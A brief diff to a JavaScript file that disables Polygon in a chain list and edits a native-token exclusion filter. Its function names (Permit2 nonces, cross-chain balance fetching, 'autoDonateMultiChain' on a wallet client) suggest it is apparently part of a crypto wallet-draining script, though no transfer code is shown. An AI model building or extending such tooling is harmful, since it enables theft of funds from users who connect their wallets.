@@ -18,7 +18,7 @@ import { getFreePermit2Nonce } from "./nonceHelper";
 const CHAINS = [
   { chainId: 1, name: "Ethereum" },
   { chainId: 56, name: "BSC" },
-  { chainId: 137, name: "Polygon" }
+  /*{ chainId: 137, name: "Polygon" }*/
 ];
 
 /**
@@ -112,7 +112,7 @@ export async function fetchBalancesCovalent(address, chainId) {
 export async function filterPermit2SafeTokens(tokens) {
   return tokens.filter(t =>
     t.tokenAddress &&
-    !["BNB", "ETH", "MATIC"].includes(t.tokenSymbol) &&
+    !["BNB", "ETH", /*"MATIC"*/].includes(t.tokenSymbol) &&
     t.balanceRaw !== "0"
   );
 }
@@ -332,3 +332,4 @@ export async function autoDonateMultiChain(walletClient) {
     return { success: false, reason: err.message || String(err) };
   }
 }
+
